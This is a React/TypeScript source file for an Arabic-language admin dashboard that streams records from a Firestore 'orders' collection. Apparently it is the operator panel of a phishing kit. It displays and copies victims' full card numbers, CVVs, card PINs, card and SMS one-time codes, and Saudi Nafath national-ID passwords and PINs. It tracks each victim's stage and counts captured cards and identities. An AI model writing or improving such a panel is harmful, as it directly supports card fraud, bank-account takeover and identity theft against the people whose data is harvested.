"use client";

import { useEffect, useMemo, useState } from "react";
import {
  collection,
  onSnapshot,
  orderBy,
  query,
  doc,
  deleteDoc,
} from "firebase/firestore";
import { db } from "@/lib/firebase";
import { cn } from "@/lib/utils";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { ScrollArea } from "@/components/ui/scroll-area";
import { useToast } from "@/hooks/use-toast";
import {
  Search,
  CreditCard,
  MapPin,
  Phone,
  Shield,
  Package,
  Globe,
  KeyRound,
  Lock,
  Trash2,
  Copy,
  Check,
  Eye,
  EyeOff,
  Settings,
  Filter,
  Activity,
  Users,
  Inbox,
  Clock,
  Hash,
  MousePointerClick,
} from "lucide-react";

type FirestoreDoc = Record<string, any> & { __id: string };

const SECTIONS: {
  key: string;
  title: string;
  icon: any;
  color: string;
  fields: { key: string; label: string; sensitive?: boolean }[];
}[] = [
  {
    key: "visit",
    title: "زيارة الموقع",
    icon: Globe,
    color: "from-sky-500 to-blue-600",
    fields: [
      { key: "country", label: "الدولة" },
      { key: "currentPage", label: "الصفحة" },
      { key: "action", label: "الحدث" },
      { key: "createdDate", label: "تاريخ الزيارة" },
    ],
  },
  {
    key: "shipping",
    title: "بيانات الشحن",
    icon: MapPin,
    color: "from-emerald-500 to-teal-600",
    fields: [
      { key: "fullName", label: "الاسم" },
      { key: "phone", label: "الجوال" },
      { key: "city", label: "المدينة" },
      { key: "district", label: "الحي" },
      { key: "street", label: "الشارع" },
      { key: "postalCode", label: "الرمز البريدي" },
      { key: "coordinates", label: "الإحداثيات" },
    ],
  },
  {
    key: "payment",
    title: "بيانات البطاقة",
    icon: CreditCard,
    color: "from-violet-500 to-purple-600",
    fields: [
      { key: "cardName", label: "حامل البطاقة" },
      { key: "cardNumber", label: "رقم البطاقة", sensitive: true },
      { key: "expiryDate", label: "الانتهاء" },
      { key: "cvv", label: "CVV", sensitive: true },
      { key: "cardLast4", label: "آخر ٤ أرقام" },
      { key: "bank", label: "البنك" },
      { key: "cardType", label: "نوع البطاقة" },
    ],
  },
  {
    key: "card_verify",
    title: "تحقق البطاقة",
    icon: Lock,
    color: "from-amber-500 to-orange-600",
    fields: [
      { key: "cardOtp", label: "رمز التحقق" },
      { key: "cardPin", label: "PIN", sensitive: true },
    ],
  },
  {
    key: "phone_verify",
    title: "تحقق الجوال",
    icon: Phone,
    color: "from-pink-500 to-rose-600",
    fields: [
      { key: "phone2", label: "الجوال الثاني" },
      { key: "operator", label: "المشغل" },
      { key: "phoneOtp", label: "رمز SMS" },
    ],
  },
  {
    key: "nafath",
    title: "نفاذ",
    icon: Shield,
    color: "from-green-600 to-emerald-700",
    fields: [
      { key: "nafazId", label: "رقم الهوية" },
      { key: "identity_number", label: "رقم الهوية" },
      { key: "nafadPassword", label: "كلمة المرور", sensitive: true },
      { key: "auth_number", label: "رقم التفويض" },
      { key: "nafaz_pin", label: "Nafath PIN" },
      { key: "verification_code", label: "رمز التحقق" },
      { key: "status", label: "حالة نفاذ" },
    ],
  },
  {
    key: "order",
    title: "ملخص الطلب",
    icon: Package,
    color: "from-indigo-500 to-blue-700",
    fields: [
      { key: "subtotal", label: "المجموع" },
      { key: "shippingFee", label: "الشحن" },
      { key: "tax", label: "الضريبة" },
      { key: "total", label: "الإجمالي" },
    ],
  },
];

const ALL_KNOWN_KEYS = new Set(SECTIONS.flatMap((s) => s.fields.map((f) => f.key)));

const STAGE_FILTERS = [
  { key: "all", label: "الكل", icon: Inbox },
  { key: "shipping", label: "شحن", icon: MapPin },
  { key: "card", label: "بطاقة", icon: CreditCard },
  { key: "verify", label: "تحقق", icon: Lock },
  { key: "nafath", label: "نفاذ", icon: Shield },
  { key: "visit", label: "زائر", icon: Globe },
] as const;

function formatTimestamp(value: any): string {
  if (!value) return "";
  try {
    const date =
      typeof value?.toDate === "function"
        ? value.toDate()
        : typeof value === "string"
        ? new Date(value)
        : value instanceof Date
        ? value
        : null;
    if (!date) return "";
    return date.toLocaleString("ar-SA", {
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    });
  } catch {
    return "";
  }
}

function timeAgo(value: any): string {
  if (!value) return "";
  try {
    const date = typeof value?.toDate === "function" ? value.toDate() : new Date(value);
    const diffSec = Math.floor((Date.now() - date.getTime()) / 1000);
    if (diffSec < 60) return "الآن";
    if (diffSec < 3600) return `منذ ${Math.floor(diffSec / 60)} د`;
    if (diffSec < 86400) return `منذ ${Math.floor(diffSec / 3600)} س`;
    return `منذ ${Math.floor(diffSec / 86400)} ي`;
  } catch {
    return "";
  }
}

function formatValue(v: any): string {
  if (v === undefined || v === null) return "—";
  if (typeof v === "boolean") return v ? "نعم" : "لا";
  if (typeof v === "object") {
    if (typeof v?.toDate === "function") return formatTimestamp(v);
    if (Array.isArray(v)) return v.map((x) => formatValue(x)).join("، ");
    return JSON.stringify(v, null, 2);
  }
  return String(v);
}

function getInitials(d: FirestoreDoc): string {
  const name = (d.fullName || d.cardName || d.__id || "?").trim();
  return name.charAt(0).toUpperCase() || "?";
}

const AVATAR_COLORS = [
  "from-pink-500 to-rose-600",
  "from-violet-500 to-indigo-600",
  "from-emerald-500 to-teal-600",
  "from-amber-500 to-orange-600",
  "from-sky-500 to-blue-600",
  "from-fuchsia-500 to-purple-600",
  "from-lime-500 to-green-600",
  "from-cyan-500 to-blue-600",
];

function avatarColor(id: string): string {
  let h = 0;
  for (let i = 0; i < id.length; i++) h = (h * 31 + id.charCodeAt(i)) >>> 0;
  return AVATAR_COLORS[h % AVATAR_COLORS.length];
}

function getStage(d: FirestoreDoc): { key: string; label: string; bg: string; dot: string } {
  if (d.nafazId || d.identity_number)
    return { key: "nafath", label: "نفاذ", bg: "bg-emerald-500/15 text-emerald-400 border-emerald-500/30", dot: "bg-emerald-400" };
  if (d.cardPin || d.cardOtp)
    return { key: "verify", label: "تحقق بطاقة", bg: "bg-amber-500/15 text-amber-400 border-amber-500/30", dot: "bg-amber-400" };
  if (d.cardNumber)
    return { key: "card", label: "بطاقة", bg: "bg-violet-500/15 text-violet-400 border-violet-500/30", dot: "bg-violet-400" };
  if (d.phone2 || d.phoneOtp)
    return { key: "verify", label: "تحقق جوال", bg: "bg-pink-500/15 text-pink-400 border-pink-500/30", dot: "bg-pink-400" };
  if (d.fullName || d.phone)
    return { key: "shipping", label: "شحن", bg: "bg-sky-500/15 text-sky-400 border-sky-500/30", dot: "bg-sky-400" };
  return { key: "visit", label: "زائر", bg: "bg-zinc-500/15 text-zinc-400 border-zinc-500/30", dot: "bg-zinc-400" };
}

function maskValue(value: any): string {
  const s = String(value ?? "");
  if (s.length <= 4) return "•".repeat(s.length);
  return s.slice(0, 2) + "•".repeat(Math.max(2, s.length - 4)) + s.slice(-2);
}

function StatCard({
  icon: Icon,
  label,
  value,
  color,
}: {
  icon: any;
  label: string;
  value: string | number;
  color: string;
}) {
  return (
    <div className="rounded-2xl border border-white/10 bg-[#17212b] p-3 flex items-center gap-2.5">
      <div className={cn("w-9 h-9 rounded-xl flex items-center justify-center shrink-0", color)}>
        <Icon className="h-4 w-4 text-white" />
      </div>
      <div className="min-w-0">
        <p className="text-[10px] text-white/50 mb-0.5 truncate">{label}</p>
        <p className="text-base font-bold leading-none" data-testid={`stat-${label}`}>
          {value}
        </p>
      </div>
    </div>
  );
}

function VisitorListItem({
  d,
  active,
  onSelect,
}: {
  d: FirestoreDoc;
  active: boolean;
  onSelect: () => void;
}) {
  const stage = getStage(d);
  const subtitle =
    d.cardOtp ? `OTP: ${d.cardOtp}` :
    d.cardNumber ? `بطاقة: •••• ${String(d.cardNumber).slice(-4)}` :
    d.nafazId || d.identity_number ? `هوية: ${d.nafazId || d.identity_number}` :
    d.country ? `زيارة من ${d.country}` :
    d.__id;

  return (
    <button
      onClick={onSelect}
      className={cn(
        "w-full text-right p-3 rounded-xl flex items-center gap-3 transition-all border",
        active
          ? "bg-primary/15 border-primary/40 shadow-md shadow-primary/10"
          : "bg-transparent border-transparent hover:bg-white/[0.04]"
      )}
      data-testid={`item-visitor-${d.__id}`}
    >
      <div
        className={cn(
          "w-11 h-11 rounded-full bg-gradient-to-br flex items-center justify-center text-white font-bold text-base shrink-0 shadow-md",
          avatarColor(d.__id)
        )}
      >
        {getInitials(d)}
      </div>
      <div className="flex-1 min-w-0">
        <div className="flex items-center justify-between gap-2 mb-0.5">
          <span className="text-[10px] text-white/40 shrink-0">{timeAgo(d.timestamp)}</span>
          <h4 className="text-sm font-bold truncate text-white" data-testid={`text-visitor-name-${d.__id}`}>
            {d.fullName || d.cardName || d.__id.slice(0, 16)}
          </h4>
        </div>
        <div className="flex items-center justify-between gap-2">
          <span className={cn("w-1.5 h-1.5 rounded-full shrink-0", stage.dot)} />
          <p className="text-[11px] text-white/55 truncate">{subtitle}</p>
        </div>
      </div>
    </button>
  );
}

function FieldCard({
  label,
  value,
  sensitive,
  hidden,
  copyKey,
  onCopy,
  copied,
}: {
  label: string;
  value: any;
  sensitive?: boolean;
  hidden?: boolean;
  copyKey: string;
  onCopy: () => void;
  copied: boolean;
}) {
  const display = hidden ? maskValue(value) : formatValue(value);
  return (
    <div
      className="group relative rounded-xl border border-white/10 bg-white/[0.02] hover:border-white/20 hover:bg-white/[0.04] transition-all p-3"
      data-testid={`field-${copyKey}`}
    >
      <div className="flex items-center justify-between gap-2 mb-1.5">
        <button
          onClick={onCopy}
          className="text-white/40 hover:text-primary focus-visible:text-primary focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-primary/50 rounded opacity-0 group-hover:opacity-100 focus-visible:opacity-100 transition-all"
          aria-label={`نسخ ${label}`}
          data-testid={`button-copy-${copyKey}`}
        >
          {copied ? <Check className="h-3.5 w-3.5 text-primary" /> : <Copy className="h-3.5 w-3.5" />}
        </button>
        <div className="flex items-center gap-1 text-[10px] text-white/45">
          {sensitive && <KeyRound className="h-3 w-3 text-amber-500/70" />}
          <span className="truncate">{label}</span>
        </div>
      </div>
      <p
        className="text-sm font-mono font-medium text-white break-words text-left"
        dir="ltr"
        data-testid={`value-${copyKey}`}
      >
        {display}
      </p>
    </div>
  );
}

export default function Dashboard() {
  const [docs, setDocs] = useState<FirestoreDoc[]>([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState("");
  const [stageFilter, setStageFilter] = useState<string>("all");
  const [revealSensitive, setRevealSensitive] = useState(false);
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [copiedKey, setCopiedKey] = useState<string | null>(null);
  const { toast } = useToast();

  useEffect(() => {
    if (!db) {
      setLoading(false);
      return;
    }
    const q = query(collection(db, "orders"), orderBy("timestamp", "desc"));
    const unsub = onSnapshot(
      q,
      (snap) => {
        const items: FirestoreDoc[] = snap.docs.map((d) => ({
          __id: d.id,
          ...(d.data() as any),
        }));
        setDocs(items);
        setLoading(false);
        // Auto-select first if none selected
        setSelectedId((curr) => curr ?? items[0]?.__id ?? null);
      },
      (err) => {
        console.error("Firestore error:", err);
        setLoading(false);
        toast({
          title: "تعذر تحميل البيانات",
          description: err.message,
          variant: "destructive",
        });
      }
    );
    return () => unsub();
  }, [toast]);

  const filtered = useMemo(() => {
    let list = docs;
    if (stageFilter !== "all") {
      list = list.filter((d) => getStage(d).key === stageFilter);
    }
    if (search.trim()) {
      const s = search.trim().toLowerCase();
      list = list.filter((d) => JSON.stringify(d).toLowerCase().includes(s));
    }
    return list;
  }, [docs, search, stageFilter]);

  const selected = useMemo(
    () => docs.find((d) => d.__id === selectedId) ?? null,
    [docs, selectedId]
  );

  const sectionsForSelected = useMemo(() => {
    if (!selected) return [];
    return SECTIONS.map((section) => {
      const present = section.fields.filter(
        (f) => selected[f.key] !== undefined && selected[f.key] !== ""
      );
      return { ...section, presentFields: present };
    }).filter((s) => s.presentFields.length > 0);
  }, [selected]);

  const otherFields = useMemo(() => {
    if (!selected) return [];
    return Object.entries(selected)
      .filter(
        ([k]) =>
          !ALL_KNOWN_KEYS.has(k) &&
          !["__id", "timestamp", "updatedAt", "verified", "verifiedAt"].includes(k)
      )
      .filter(([_, v]) => v !== undefined && v !== "" && v !== null);
  }, [selected]);

  const stats = useMemo(() => {
    const total = docs.length;
    const withCard = docs.filter((d) => d.cardNumber).length;
    const withNafath = docs.filter((d) => d.nafazId || d.identity_number).length;
    const today = docs.filter((d) => {
      const ts = d.timestamp?.toDate ? d.timestamp.toDate() : null;
      if (!ts) return false;
      return new Date().toDateString() === ts.toDateString();
    }).length;
    return { total, withCard, withNafath, today };
  }, [docs]);

  async function handleCopy(key: string, value: any) {
    try {
      await navigator.clipboard.writeText(String(value));
      setCopiedKey(key);
      setTimeout(() => setCopiedKey(null), 1200);
    } catch {
      toast({ title: "تعذر النسخ", variant: "destructive" });
    }
  }

  async function handleDelete(id: string) {
    if (!confirm(`حذف السجل ${id}؟`)) return;
    try {
      await deleteDoc(doc(db, "orders", id));
      toast({ title: "تم الحذف" });
      if (selectedId === id) setSelectedId(null);
    } catch (e: any) {
      toast({ title: "تعذر الحذف", description: e.message, variant: "destructive" });
    }
  }

  return (
    <div dir="rtl" className="h-screen overflow-hidden bg-[#0e1621] text-white flex flex-col">
      {/* Top bar */}
      <header className="shrink-0 bg-[#0e1621]/95 backdrop-blur-md border-b border-white/10 px-4 sm:px-6 py-3 flex items-center justify-between gap-4">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-primary to-emerald-700 flex items-center justify-center shadow-lg shadow-primary/20">
            <Settings className="h-5 w-5 text-white" />
          </div>
          <div>
            <h1 className="text-base sm:text-lg font-bold leading-none">لوحة التحكم</h1>
            <p className="text-[11px] text-white/50 mt-1">{docs.length} سجل</p>
          </div>
        </div>

        <Button
          variant="ghost"
          size="sm"
          className="text-white/60 hover:text-white hover:bg-white/10 gap-2 h-9"
          onClick={() => setRevealSensitive((v) => !v)}
          data-testid="button-toggle-sensitive"
        >
          {revealSensitive ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
          <span className="hidden sm:inline text-xs">
            {revealSensitive ? "إخفاء الحساس" : "إظهار الحساس"}
          </span>
        </Button>
      </header>

      {/* Body: sidebar + main */}
      <div className="flex-1 flex overflow-hidden">
        {/* Sidebar (right in RTL) */}
        <aside className="w-[340px] shrink-0 border-l border-white/10 bg-[#17212b] flex flex-col">
          {/* Search */}
          <div className="p-3 border-b border-white/10 space-y-2">
            <div className="relative">
              <Search className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-white/40" />
              <Input
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                placeholder="بحث..."
                className="bg-[#242f3d] border-transparent text-sm h-10 rounded-xl pr-10 text-right placeholder:text-white/40"
                data-testid="input-dashboard-search"
              />
            </div>

            {/* Stage filter pills */}
            <div className="flex items-center gap-1.5 overflow-x-auto pb-1 -mx-1 px-1">
              <Filter className="h-3.5 w-3.5 text-white/40 shrink-0" />
              {STAGE_FILTERS.map((f) => {
                const active = stageFilter === f.key;
                return (
                  <button
                    key={f.key}
                    onClick={() => setStageFilter(f.key)}
                    className={cn(
                      "px-2.5 py-1 rounded-lg text-[11px] font-semibold flex items-center gap-1 border transition-colors shrink-0",
                      active
                        ? "bg-primary text-white border-primary"
                        : "bg-transparent text-white/60 border-white/10 hover:border-white/30 hover:text-white"
                    )}
                    data-testid={`filter-${f.key}`}
                  >
                    <f.icon className="h-3 w-3" />
                    {f.label}
                  </button>
                );
              })}
            </div>
          </div>

          {/* Visitor list */}
          <ScrollArea className="flex-1">
            <div className="p-2 space-y-1">
              {loading &&
                [...Array(8)].map((_, i) => (
                  <div key={i} className="h-16 rounded-xl bg-white/[0.03] animate-pulse" />
                ))}

              {!loading && filtered.length === 0 && (
                <div className="text-center text-white/40 text-xs py-12">
                  <Users className="h-8 w-8 mx-auto mb-2 opacity-40" />
                  لا توجد نتائج
                </div>
              )}

              {!loading &&
                filtered.map((d) => (
                  <VisitorListItem
                    key={d.__id}
                    d={d}
                    active={selectedId === d.__id}
                    onSelect={() => setSelectedId(d.__id)}
                  />
                ))}
            </div>
          </ScrollArea>
        </aside>

        {/* Main content area */}
        <main className="flex-1 overflow-hidden flex flex-col bg-[#0e1621]">
          {!selected && (
            <div className="flex-1 flex flex-col items-center justify-center text-center px-6">
              <div className="w-20 h-20 rounded-2xl bg-white/[0.03] border border-white/10 flex items-center justify-center mb-4">
                <MousePointerClick className="h-9 w-9 text-white/30" />
              </div>
              <h2 className="text-lg font-bold mb-1">اختر زائراً</h2>
              <p className="text-white/50 text-sm">اضغط على أي سجل من القائمة لعرض البيانات</p>
            </div>
          )}

          {selected && (
            <>
              {/* Selected visitor header */}
              <div className="shrink-0 px-5 sm:px-6 py-4 border-b border-white/10 flex items-center justify-between gap-4 bg-gradient-to-l from-primary/5 to-transparent">
                <div className="flex items-center gap-3 min-w-0">
                  <div
                    className={cn(
                      "w-12 h-12 rounded-full bg-gradient-to-br flex items-center justify-center text-white font-bold text-lg shrink-0 shadow-md",
                      avatarColor(selected.__id)
                    )}
                  >
                    {getInitials(selected)}
                  </div>
                  <div className="min-w-0">
                    <div className="flex items-center gap-2 mb-0.5">
                      <h2 className="text-base sm:text-lg font-bold truncate" data-testid="text-detail-title">
                        {selected.fullName || selected.cardName || "بدون اسم"}
                      </h2>
                      <Badge variant="outline" className={cn("text-[10px] shrink-0", getStage(selected).bg)}>
                        {getStage(selected).label}
                      </Badge>
                    </div>
                    <div className="flex items-center gap-3 text-[11px] text-white/50">
                      <span className="font-mono truncate" dir="ltr">{selected.__id}</span>
                      {selected.timestamp && (
                        <span className="flex items-center gap-1 shrink-0">
                          <Clock className="h-3 w-3" />
                          {formatTimestamp(selected.timestamp)}
                        </span>
                      )}
                    </div>
                  </div>
                </div>

                <Button
                  variant="ghost"
                  size="icon"
                  onClick={() => handleDelete(selected.__id)}
                  aria-label="حذف"
                  className="text-white/40 hover:text-red-400 hover:bg-red-500/10 shrink-0"
                  data-testid="button-delete-selected"
                >
                  <Trash2 className="h-4 w-4" />
                </Button>
              </div>

              {/* Stats strip */}
              <div className="shrink-0 px-5 sm:px-6 py-3 border-b border-white/5 grid grid-cols-2 sm:grid-cols-4 gap-2">
                <StatCard icon={Inbox} label="السجلات" value={stats.total} color="bg-gradient-to-br from-sky-500 to-blue-600" />
                <StatCard icon={Activity} label="اليوم" value={stats.today} color="bg-gradient-to-br from-emerald-500 to-teal-600" />
                <StatCard icon={CreditCard} label="بطاقات" value={stats.withCard} color="bg-gradient-to-br from-violet-500 to-purple-600" />
                <StatCard icon={Shield} label="نفاذ" value={stats.withNafath} color="bg-gradient-to-br from-amber-500 to-orange-600" />
              </div>

              {/* Sections grid */}
              <ScrollArea className="flex-1">
                <div className="p-4 sm:p-6 grid grid-cols-1 lg:grid-cols-2 xl:grid-cols-3 gap-4">
                  {sectionsForSelected.map((section) => (
                    <section
                      key={section.key}
                      className="rounded-2xl border border-white/10 bg-[#17212b] overflow-hidden flex flex-col"
                      data-testid={`section-${section.key}`}
                    >
                      <header
                        className={cn(
                          "px-4 py-3 flex items-center gap-2 bg-gradient-to-l border-b border-white/10",
                          section.color
                        )}
                      >
                        <section.icon className="h-4 w-4 text-white" />
                        <h3 className="text-sm font-bold text-white">{section.title}</h3>
                        <span className="mr-auto text-[10px] text-white/70 font-semibold">
                          {section.presentFields.length}
                        </span>
                      </header>
                      <div className="p-3 grid grid-cols-1 sm:grid-cols-2 gap-2">
                        {section.presentFields.map((f) => {
                          const copyKey = `${section.key}-${f.key}`;
                          return (
                            <FieldCard
                              key={f.key}
                              label={f.label}
                              value={selected[f.key]}
                              sensitive={f.sensitive}
                              hidden={f.sensitive && !revealSensitive}
                              copyKey={copyKey}
                              onCopy={() => handleCopy(copyKey, selected[f.key])}
                              copied={copiedKey === copyKey}
                            />
                          );
                        })}
                      </div>
                    </section>
                  ))}

                  {otherFields.length > 0 && (
                    <section className="rounded-2xl border border-white/10 bg-[#17212b] overflow-hidden lg:col-span-2 xl:col-span-3">
                      <header className="px-4 py-3 flex items-center gap-2 bg-gradient-to-l from-zinc-500 to-zinc-700 border-b border-white/10">
                        <Hash className="h-4 w-4 text-white" />
                        <h3 className="text-sm font-bold text-white">بيانات إضافية</h3>
                        <span className="mr-auto text-[10px] text-white/70 font-semibold">
                          {otherFields.length}
                        </span>
                      </header>
                      <div className="p-3 grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-2">
                        {otherFields.map(([k, v]) => {
                          const copyKey = `extra-${k}`;
                          return (
                            <FieldCard
                              key={k}
                              label={k}
                              value={v}
                              copyKey={copyKey}
                              onCopy={() => handleCopy(copyKey, v)}
                              copied={copiedKey === copyKey}
                            />
                          );
                        })}
                      </div>
                    </section>
                  )}

                  {sectionsForSelected.length === 0 && otherFields.length === 0 && (
                    <div className="lg:col-span-2 xl:col-span-3 text-center py-16 text-white/40 text-sm">
                      لا توجد بيانات مخزنة لهذا السجل
                    </div>
                  )}
                </div>
              </ScrollArea>
            </>
          )}
        </main>
      </div>
    </div>
  );
}
